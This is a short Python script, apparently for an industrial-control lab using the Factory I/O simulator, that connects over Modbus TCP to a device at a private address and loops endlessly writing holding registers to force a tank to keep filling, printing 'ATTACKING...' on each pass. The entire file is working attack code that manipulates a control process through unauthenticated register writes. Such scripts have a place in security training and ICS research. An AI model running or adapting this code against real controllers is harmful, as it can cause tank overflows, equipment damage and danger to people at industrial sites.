from pymodbus.client import ModbusTcpClient
import time

FACTORY_IP = "192.168.10.107"

client = ModbusTcpClient(FACTORY_IP, port=503)
if not client.connect():
        print("Client connection failed")
        raise SystemExit

print("Connected to Factory I/O")

try:
        while True:
                print("ATTACKING...")
                client.write_register(address=0, value=1000)
                client.write_register(address=1, value=0)


                print("Tank filling")
                time.sleep(0)


except KeyboardInterrupt:
        print("Stopping attack")

finally:
        client.close()
        print("Client connection closed")
